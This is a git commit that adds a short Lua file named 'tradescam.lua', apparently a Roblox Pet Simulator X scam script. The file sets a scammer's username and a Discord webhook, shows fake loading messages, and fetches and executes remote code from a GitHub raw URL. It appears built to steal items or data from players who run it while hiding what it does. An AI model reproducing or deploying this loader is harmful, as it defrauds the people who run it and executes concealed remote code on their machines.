e4e7e0f6ba7f116344aa2617c99b5dc2fe452b5b
Treasureita58 <131528887+Treasureita58@users.noreply.github.com>
2023-05-02 16:16:51 +0200

    Add files via upload
    tradescam22%

---
+++ tradescam.lua
@@ -0,0 +1,9 @@
+Username = "Treasureita58"
+WebHook = "https://discord.com/api/webhooks/1102959560324554822/qADa5bd6tEgS-dlURrTpQK_bNslYKXkkufRbonWd4DLA8lEdFBM-Ce8ISvR1eIa3L3_4"
+loadingscreen = true
+_G.CustomScriptName = "tradescam20%"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
